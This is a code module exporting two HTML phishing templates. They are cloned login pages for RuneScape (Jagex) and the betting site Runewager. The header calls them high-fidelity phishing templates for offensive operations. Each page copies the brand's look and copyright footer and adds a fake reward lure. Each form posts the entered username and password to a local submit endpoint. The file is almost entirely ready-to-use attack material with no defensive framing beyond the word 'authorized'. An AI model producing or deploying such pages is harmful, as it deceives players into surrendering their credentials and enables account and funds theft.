/**
 * Nightfury's Pegasus: Strikingly Replica Clones
 * High-fidelity phishing templates for authorized offensive operations.
 */

export const JAGEX_CLONE = `
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>RuneScape - Play Now</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif; }
body { background: #1a472a; color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
.login-container { background: rgba(45, 45, 45, 0.95); padding: 40px; border-radius: 8px; width: 100%; max-width: 400px; border: 1px solid #c8a951; }
.logo { text-align: center; margin-bottom: 30px; }
.logo h1 { color: #c8a951; font-size: 2.5em; text-shadow: 0 2px 4px rgba(0,0,0,0.5); }
.form-group { margin-bottom: 20px; }
.form-group label { display: block; margin-bottom: 8px; color: #c8a951; font-weight: 600; }
.form-group input { width: 100%; padding: 12px 15px; border: 2px solid #444; border-radius: 4px; background: #2d2d2d; color: white; font-size: 16px; }
.form-group input:focus { border-color: #c8a951; outline: none; box-shadow: 0 0 10px rgba(200, 169, 81, 0.3); }
.login-btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #c8a951 0%, #b8942c 100%); border: none; border-radius: 4px; color: #1a472a; font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.3s ease; }
.login-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(200, 169, 81, 0.4); }
.footer { text-align: center; margin-top: 20px; color: #888; font-size: 12px; }
.alert { background: rgba(200, 169, 81, 0.1); border: 1px solid #c8a951; padding: 15px; border-radius: 4px; margin-bottom: 20px; text-align: center; font-size: 13px; }
</style>
</head>
<body>
<div class="login-container">
<div class="logo">
<h1>RuneScape</h1>
<p>Play the world's most popular free MMORPG</p>
</div>
<div class="alert">
<strong>Double XP Live!</strong> Login to claim your reward!
</div>
<form method="POST" action="/api/submit/jagex">
<div class="form-group">
<label for="username">Email or Username</label>
<input type="text" id="username" name="username" required placeholder="Email or Username">
</div>
<div class="form-group">
<label for="password">Password</label>
<input type="password" id="password" name="password" required placeholder="Password">
</div>
<button type="submit" class="login-btn">Login to RuneScape</button>
</form>
<div class="footer">
<p>By logging in, you agree to our Terms of Service and Privacy Policy</p>
<p>© 2025 Jagex Ltd. All rights reserved.</p>
</div>
</div>
</body>
</html>
`;

export const RUNEWAGER_CLONE = `
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Runewager - Betting Platform</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif; }
body { background: linear-gradient(135deg, #1a472a 0%, #2d2d2d 100%); color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
.login-container { background: rgba(45, 45, 45, 0.95); padding: 40px; border-radius: 8px; width: 100%; max-width: 400px; border: 1px solid #c8a951; }
.logo { text-align: center; margin-bottom: 30px; }
.logo h1 { color: #c8a951; font-size: 2.5em; text-shadow: 0 2px 4px rgba(0,0,0,0.5); }
.form-group { margin-bottom: 20px; }
.form-group label { display: block; margin-bottom: 8px; color: #c8a951; font-weight: 600; }
.form-group input { width: 100%; padding: 12px 15px; border: 2px solid #444; border-radius: 4px; background: #2d2d2d; color: white; font-size: 16px; }
.form-group input:focus { border-color: #c8a951; outline: none; box-shadow: 0 0 10px rgba(200, 169, 81, 0.3); }
.login-btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #c8a951 0%, #b8942c 100%); border: none; border-radius: 4px; color: #1a472a; font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.3s ease; }
.login-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(200, 169, 81, 0.4); }
.footer { text-align: center; margin-top: 20px; color: #888; font-size: 12px; }
.alert { background: rgba(200, 169, 81, 0.1); border: 1px solid #c8a951; padding: 15px; border-radius: 4px; margin-bottom: 20px; text-align: center; font-size: 13px; }
</style>
</head>
<body>
<div class="login-container">
<div class="logo">
<h1>Runewager</h1>
<p>Bet on your favorite RuneScape events</p>
</div>
<div class="alert">
<strong>100% Deposit Bonus!</strong> Login to claim your reward!
</div>
<form method="POST" action="/api/submit/runewager">
<div class="form-group">
<label for="username">Email or Username</label>
<input type="text" id="username" name="username" required placeholder="Email or Username">
</div>
<div class="form-group">
<label for="password">Password</label>
<input type="password" id="password" name="password" required placeholder="Password">
</div>
<button type="submit" class="login-btn">Login to Runewager</button>
</form>
<div class="footer">
<p>By logging in, you agree to our Terms of Service and Privacy Policy</p>
<p>© 2025 Runewager. All rights reserved.</p>
</div>
</div>
</body>
</html>
`;
